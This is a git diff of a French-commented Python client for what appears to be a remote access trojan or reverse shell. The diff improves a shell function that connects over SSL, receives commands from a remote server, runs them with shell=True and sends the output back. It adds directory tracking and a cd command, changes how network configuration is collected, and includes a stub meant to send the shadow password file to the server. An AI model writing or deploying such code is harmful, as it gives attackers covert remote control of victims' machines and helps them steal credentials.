@@ -52,20 +52,31 @@ def upload(ssl_socket):
 
 # Fonction permettant d'accepter un shell depuis le serveur
 def shell(ssl_socket):
+    repertoire_actuel = os.getcwd()  # Stockage du répertoire actuel
+    repertoire_actuel_to_send = f"[*] Répertoire actuel : {repertoire_actuel}"
+    ssl_socket.send(repertoire_actuel_to_send.encode())
     while True:
         commande_shell_received = ssl_socket.recv(4096).decode()  # Récupération de la commande Shell du serveur
         if commande_shell_received.lower() == 'quit':  # Gestion de la sortie du Shell
             break
-        commande_shell = subprocess.run(commande_shell_received, shell=True, capture_output=True, text=True)  # Exécution de la commande Shell et stockage de ses sorties
-        commande_shell_to_send = commande_shell.stdout + commande_shell.stderr  # Concaténation des sorties de la commande Shell
+        elif commande_shell_received.lower() == 'help':
+            commande_shell_to_send = f"[*] quit        : quiter le shell actif\n"
+        elif commande_shell_received.lower().startswith('cd'):
+            _, dossier = commande_shell_received.split(' ', 1) # Récupération du répertoire cible de la commande
+            os.chdir(dossier)
+            repertoire_actuel = os.getcwd() # Mise à jour du répertoire actuel
+            commande_shell_to_send = f"[*] Changement de répertoire vers : {repertoire_actuel}\n"
+        else:
+            commande_shell = subprocess.run(commande_shell_received, shell=True, capture_output=True, text=True, cwd=repertoire_actuel)  # Exécution de la commande Shell dans le répertoire actuel et stockage de ses sorties
+            commande_shell_to_send = commande_shell.stdout + commande_shell.stderr  # Concaténation des sorties de la commande Shell
         ssl_socket.send(commande_shell_to_send.encode())  # Envoie de la réponse de la commande Shell
 
 # Fonction permettant d'envoyer la configuration réseau au serveur
 def ipconfig(ssl_socket):
     os_type = os.name  # Récupération du nom de l'OS de la machine
     if os_type == "posix":  # Test si la machine est une Linux
-        conf = subprocess.run(['ifconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)  # Exécution de la commande "ifconfig" et stockage de ses sorties
-        conf_to_send = conf.stdout + conf.stderr  # Concaténation des sorties de la commande "ifconfig"
+        conf = subprocess.run(['ip', 'a'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)  # Exécution de la commande "ip a" et stockage de ses sorties
+        conf_to_send = conf.stdout + conf.stderr  # Concaténation des sorties de la commande "ip a"
     elif os_type == "nt":  # Test si la machine est une Windows
         conf = subprocess.run(['ipconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)  # Exécution de la commande "ipconfig" et stockage de ses sorties
         conf_to_send = conf.stdout + conf.stderr  # Concaténation des sorties de la commande "ipconfig"
@@ -101,6 +112,9 @@ def search(ssl_socket):
 # Fonction permettant d'envoyer le fichier shadow au serveur
 def hashdump(ssl_socket):
     print('hashdump')
+
+
+
 
 def main():
     # Récupération des variables
